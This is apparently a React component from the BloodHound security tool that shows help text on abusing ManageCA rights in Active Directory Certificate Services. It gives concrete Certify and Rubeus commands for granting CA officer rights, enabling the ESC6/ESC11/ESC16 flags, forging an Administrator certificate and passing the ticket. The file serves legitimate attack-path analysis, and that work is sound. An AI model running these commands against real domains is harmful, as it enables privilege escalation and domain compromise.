// Copyright 2023 Specter Ops, Inc.
//
// Licensed under the Apache License, Version 2.0
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.
//
// SPDX-License-Identifier: Apache-2.0

import { Link, Typography } from '@mui/material';
import { FC } from 'react';

const Abuse: FC = () => {
    return (
        <>
            <Typography variant='body2'>
                CA Administrators can perform the following actions that may enable an ADCS escalation:
                <ol style={{ listStyleType: 'decimal', paddingLeft: '1.5em' }}>
                    <li>Grant CA officer (ManageCertificates) and approve a denied certificate request</li>
                    <li>Publish a certificate template</li>
                    <li>Grant enroll on enterprise CA</li>
                    <li>
                        Enable the ESC6 CA flag <code>EDITF_ATTRIBUTESUBJECTALTNAME2</code>
                    </li>
                    <li>
                        Enable the ESC11 CA flag <code>IF_ENFORCEENCRYPTICERTREQUEST</code>
                    </li>
                    <li>Disable the security extension on the enterprise CA (ESC16)</li>
                    <li>Abuse a CDP to coerce and relay the CA server</li>
                    <li>Abuse a CDP to obtain RCE on the CA server via a webshell</li>
                </ol>
            </Typography>
            <Typography variant='body1'>
                Grant CA officer (ManageCertificates) and approve a denied certificate request
            </Typography>
            <Typography variant='body2'>
                The combination of the ManageCA and ManageCertificates permissions allow the attacker to approve
                certificate requests that were denied because lack of enrollment rights on the certificate template or
                on the enterprise CA. A common action is therefore to grant this permission, enroll in an ESC1 template
                that the attacker does not have enrollment rights on, issue the certificate of the denied request. This
                attack fails if role separation is enabled on the CA, as it enforces that users cannot have both
                ManageCA and ManageCertificates. However, this setting is very rare.
            </Typography>

            <Typography variant='body2'>
                A principal can be granted/revoked CA Officer with Certify (v2.0) with this command:
            </Typography>
            <Typography component={'pre'}>
                {
                    'Certify.exe manage-ca --ca ca01.corp.local\\CORP-CA01-CA --officer S-1-5-21-976219687-1556195986-4104514715-12345'
                }
            </Typography>
            <Typography variant='body2'>Then, an ESC1 certificate is requested:</Typography>
            <Typography component={'pre'}>
                {
                    'Certify.exe request --ca ca01.corp.local\\CORP-CA01-CA --template CustomUser --upn Administrator --sid S-1-5-21-976219687-1556195986-4104514715-500'
                }
            </Typography>
            <Typography variant='body2'>Check the printed private key and the request ID.</Typography>
            <Typography variant='body2'>Approve the certificate request by the request ID:</Typography>
            <Typography component={'pre'}>
                {'Certify.exe manage-ca --ca ca01.corp.local\\CORP-CA01-CA --issue-id 1337'}
            </Typography>
            <Typography variant='body2'>Download the certificate and get the pfx base-64:</Typography>
            <Typography component={'pre'}>
                {
                    'Certify.exe request-download --ca ca01.corp.local\\CORP-CA01-CA --id 1337 --private-key LS0tLS1CRUdJTiBSU0EgUFJJVkFURSBLRVktLS0tLQ0KT...'
                }
            </Typography>
            <Typography variant='body2'>Authenticate with the certificate using Rubeus:</Typography>
            <Typography component={'pre'}>
                {
                    'Rubeus.exe asktgt /user:Administrator /certificate:MIACAQMwgAYJKoZIhvcNAQcBoIAkgASCA+gwgDCABgkqh... /ptt'
                }
            </Typography>

            <Typography variant='body1'>Publish a certificate template</Typography>
            <Typography variant='body2'>
                Certificate templates, that for example enable ESC1, can be published/unpublished to the CA using
                Certify (v2.0) with this command:
            </Typography>
            <Typography component={'pre'}>
                {'Certify.exe manage-ca --ca ca01.corp.local\\CORP-CA01-CA --template MyTemplate'}
            </Typography>
            <Typography variant='body2'>
                See the ADCS ESC1 abuse information for details on the execution of the remaining part of that attack:{' '}
                <Link
                    target='_blank'
                    rel='noopener noreferrer'
                    href='https://bloodhound.specterops.io/resources/edges/adcs-esc1'>
                    BloodHound Docs: ADCSESC1
                </Link>
                .
            </Typography>

            <Typography variant='body1'>Grant enroll on enterprise CA</Typography>
            <Typography variant='body2'>
                Enrollment rights on the enterprise CA is required to enroll certificates.
            </Typography>
            <Typography variant='body2'>
                A principal can be granted/revoked Enroll on the CA with Certify (v2.0) with this command:
            </Typography>
            <Typography component={'pre'}>
                {
                    'Certify.exe manage-ca --ca ca01.corp.local\\CORP-CA01-CA --enroll S-1-5-21-976219687-1556195986-4104514715-12345'
                }
            </Typography>

            <Typography variant='body1'>
                Enable the ESC6 CA flag <code>EDITF_ATTRIBUTESUBJECTALTNAME2</code>
            </Typography>
            <Typography variant='body2'>
                The <code>EDITF_ATTRIBUTESUBJECTALTNAME2</code> flag can be enabled/disabled with Certify (2.0) using
                this command:
            </Typography>
            <Typography component={'pre'}>
                {'Certify.exe manage-ca --ca ca01.corp.local\\CORP-CA01-CA --esc6'}
            </Typography>
            <Typography variant='body2'>
                The change does not apply until the CA service is restarted. Restarting the CA service requires admin
                rights on the CA host.
            </Typography>
            <Typography variant='body2'>
                See the ADCS ESC6 abuse information for details on the execution of the remaining part of that attack:{' '}
                <Link
                    target='_blank'
                    rel='noopener noreferrer'
                    href='https://bloodhound.specterops.io/resources/edges/adcs-esc6a'>
                    BloodHound Docs: ADCSESC6a
                </Link>
                .
            </Typography>

            <Typography variant='body1'>
                Enable the ESC11 CA flag <code>IF_ENFORCEENCRYPTICERTREQUEST</code>
            </Typography>
            <Typography variant='body2'>
                The <code>IF_ENFORCEENCRYPTICERTREQUEST</code> flag can be enabled/disabled with Certify (2.0) using
                this command:
            </Typography>
            <Typography component={'pre'}>
                {'Certify.exe manage-ca --ca ca01.corp.local\\CORP-CA01-CA --esc11-req'}
            </Typography>
            <Typography variant='body2'>
                The change does not apply until the CA service is restarted. Restarting the CA service requires admin
                rights on the CA host.
            </Typography>
            <Typography variant='body2'>
                See the ADCS ESC11 abuse information for details on the execution of the remaining part of that attack:{' '}
                <Link
                    target='_blank'
                    rel='noopener noreferrer'
                    href='https://bloodhound.specterops.io/resources/edges/coerce-and-relay-ntlm-to-adcs-rpc'>
                    BloodHound Docs: CoerceAndRelayNTLMToADCSRPC
                </Link>
                .
            </Typography>

            <Typography variant='body1'>Disable the security extension on the enterprise CA (ESC16)</Typography>
            <Typography variant='body2'>
                The CA settings required for ESC16 can be enabled/disabled with Certify (2.0) using this command:
            </Typography>
            <Typography component={'pre'}>
                {'Certify.exe manage-ca --ca ca01.corp.local\\CORP-CA01-CA --esc16'}
            </Typography>
            <Typography variant='body2'>
                The change does not apply until the CA service is restarted. Restarting the CA service requires admin
                rights on the CA host.
            </Typography>
            <Typography variant='body2'>
                See the ADCS ESC16 abuse information for details on the execution of the remaining part of that attack:{' '}
                <Link
                    target='_blank'
                    rel='noopener noreferrer'
                    href='https://bloodhound.specterops.io/resources/edges/adcs-esc16'>
                    BloodHound Docs: ADCSESC16
                </Link>
                .
            </Typography>

            <Typography variant='body1'>Abuse a CDP to coerce and relay the CA server</Typography>
            <Typography variant='body2'>
                For more information, please refer to this blogpost:{' '}
                <Link
                    target='_blank'
                    rel='noopener noreferrer'
                    href='https://www.tarlogic.com/blog/ad-cs-manageca-rce/'>
                    AD CS: from ManageCA to RCE
                </Link>
                .
            </Typography>

            <Typography variant='body1'>Abuse a CDP to obtain RCE on the CA server via a webshell</Typography>
            <Typography variant='body2'>
                For more information, please refer to this blogpost:{' '}
                <Link
                    target='_blank'
                    rel='noopener noreferrer'
                    href='https://www.tarlogic.com/blog/ad-cs-manageca-rce/'>
                    AD CS: from ManageCA to RCE
                </Link>
                .
            </Typography>
        </>
    );
};

export default Abuse;
